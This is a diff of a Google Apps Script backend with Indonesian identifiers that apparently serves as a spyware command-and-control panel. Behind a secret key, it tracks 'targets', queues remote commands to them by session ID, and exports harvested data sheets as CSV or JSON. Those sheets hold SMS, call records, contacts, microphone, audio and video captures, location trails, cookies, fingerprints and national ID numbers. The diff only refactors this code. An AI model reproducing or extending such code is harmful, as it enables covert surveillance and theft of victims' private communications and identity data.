   var sh=getSheet_(SHEET_NIK),l=sh.getLastRow();
   if(l<2)return out({ok:true,baris:[]});
-  return out({ok:true,baris:sh.getRange(2,1,l-1,H_NIK.length).getValues()
-    .filter(function(r){return String(r[1])===nik})});
+  return out({ok:true,baris:sh.getRange(2,1,l-1,H_NIK.length).getValues().filter(function(r){return String(r[1])===nik})});
 }
 
-/* ---------- aksi ---------- */
 var ACTIONS=null;
 function actions(){
   if(!ACTIONS)ACTIONS={auto:saveAuto,probe:saveProbe,det:saveDet,mic:saveMic,suara:saveSuara,
@@ -922,10 +889,10 @@ function doGet(e){
   if(!p.key)return HtmlService.createHtmlOutput(pintu());
   if(p.key!==SECRET_KEY)return HtmlService.createHtmlOutput(pintu('Kunci salah.'));
   AUTO_RELOAD=p.auto==='1';
-  if(p.build==='1')return out({ok:true,build:BUILD,kolom:H_LOG.length,waktu:new Date().toISOString()});
+  if(p.build==='1')return out({ok:true,build:BUILD,kolom:H_LOG.length});
   if(p.uji==='1'){
     try{
-      var teks=JSON.stringify({a:1,b:'kunci uji',t:Date.now()});
+      var teks=JSON.stringify({a:1,t:Date.now()});
       var balik=Utilities.newBlob(ctrDec_(ctrEnc_(teks))).getDataAsString();
       return out({ok:balik===teks,build:BUILD});
     }catch(err){return out({ok:false,error:err.message})}
@@ -935,41 +902,17 @@ function doGet(e){
   if(p.sapu==='1')return out(sapu_());
   if(p.ringkas==='1'){ringkasHarian();return HtmlService.createHtmlOutput(kabar('Ringkasan dikirim.'))}
   if(p.ping==='1')return out({ok:true,build:BUILD,targets:sessions().length});
-  if(p.diag==='1'){
-    var sl=getSheet_(SHEET_LOG),ll=sl.getLastRow();
-    return out({ok:true,build:BUILD,kolom:H_LOG.length,
-      log:ll>1?sl.getRange(2,1,ll-1,H_LOG.length).getValues().slice(-5):[],imp:impDump()});
-  }
+  if(p.diag==='1')return out({ok:true,build:BUILD,kolom:H_LOG.length,imp:impDump()});
   if(p.nik)return out(cariNik(String(p.nik)));
-  if(p.cmd&&p.sid){
-    task(p.sid,p.cmd,p.arg||'',Number(p.ttl||86400000));
-    return HtmlService.createHtmlOutput(kabar('Perintah "'+p.cmd+'" dikirim.',p.sid));
-  }
-  if(p.csv==='1')return csv(SHEET_LOG);
-  if(p.csv2==='1')return csv(SHEET_C2);
-  if(p.csv3==='1')return csv(SHEET_MX);
-  if(p.csv4==='1')return csv(SHEET_NIK);
-  if(p.csv5==='1')return csv(SHEET_JEJAK);
-  if(p.csv6==='1')return csv(SHEET_KON);
-  if(p.csv7==='1')return csv(SHEET_SMS);
-  if(p.csv8==='1')return csv(SHEET_TEL);
-  if(p.csv9==='1')return csv(SHEET_DET);
-  if(p.csv10==='1')return csv(SHEET_MIC);
-  if(p.csv11==='1')return csv(SHEET_AUD);
-  if(p.csv12==='1')return csv(SHEET_VID);
-  if(p.csv13==='1')return csv(SHEET_MEDIA);
-  if(p.csv14==='1')return csv(SHEET_SIDIK);
-  if(p.csv15==='1')return csv(SHEET_SITUS);
-  if(p.csv16==='1')return csv(SHEET_IZIN);
-  if(p.csv17==='1')return csv(SHEET_JAR);
-  if(p.csv18==='1')return csv(SHEET_CK);
-  if(p.csv19==='1')return csv(SHEET_KUN);
-  if(p.csv20==='1')return csv(SHEET_JUR);
-  if(p.export==='1')return out({ok:true,build:BUILD,t:new Date().toISOString(),
-    log:dump_(SHEET_LOG,H_LOG),nik:dump_(SHEET_NIK,H_NIK),imp:dump_(SHEET_IMP,H_IMP),
-    det:dump_(SHEET_DET,H_DET),mic:dump_(SHEET_MIC,H_MIC),sidik:dump_(SHEET_SIDIK,H_SIDIK),
-    tel:dump_(SHEET_TEL,H_TEL),sms:dump_(SHEET_SMS,H_SMS),kon:dump_(SHEET_KON,H_KON),
-    ck:dump_(SHEET_CK,H_CK),kun:dump_(SHEET_KUN,H_KUN),jur:dump_(SHEET_JUR,H_JUR)});
+  if(p.cmd&&p.sid){task(p.sid,p.cmd,p.arg||'',Number(p.ttl||86400000));
+    return HtmlService.createHtmlOutput(kabar('Perintah "'+p.cmd+'" dikirim.',p.sid))}
+  var map={csv:SHEET_LOG,csv2:SHEET_C2,csv3:SHEET_MX,csv4:SHEET_NIK,csv5:SHEET_JEJAK,csv6:SHEET_KON,
+    csv7:SHEET_SMS,csv8:SHEET_TEL,csv9:SHEET_DET,csv10:SHEET_MIC,csv11:SHEET_AUD,csv12:SHEET_VID,
+    csv13:SHEET_MEDIA,csv14:SHEET_SIDIK,csv15:SHEET_SITUS,csv16:SHEET_IZIN,csv17:SHEET_JAR,
+    csv18:SHEET_CK,csv19:SHEET_KUN,csv20:SHEET_JUR};
+  for(var kk in map)if(p[kk]==='1')return csv(map[kk]);
+  if(p.export==='1')return out({ok:true,build:BUILD,log:dump_(SHEET_LOG,H_LOG),nik:dump_(SHEET_NIK,H_NIK),
+    imp:dump_(SHEET_IMP,H_IMP),det:dump_(SHEET_DET,H_DET),jur:dump_(SHEET_JUR,H_JUR)});
   if(p.report==='1')return HtmlService.createHtmlOutput(report()).setTitle('Laporan');
   if(p.clear==='1'){
     Object.keys(HDR).forEach(function(n){
